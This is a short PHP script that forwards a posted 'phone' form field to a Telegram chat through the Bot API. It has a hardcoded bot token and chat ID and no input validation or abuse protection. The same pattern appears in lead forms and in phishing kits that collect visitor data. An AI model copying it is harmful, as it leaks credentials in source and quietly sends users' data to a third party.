<?php
    if(isset($_POST["phone"]))
    {
        $apiToken = "5308589426:AAHiSuLvIFp-bccMLUQmpmnVoQQJq2x3sK8";
        $data = [
            "chat_id" => "41850257", 
            "text" => $_POST['phone']
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
    }
?>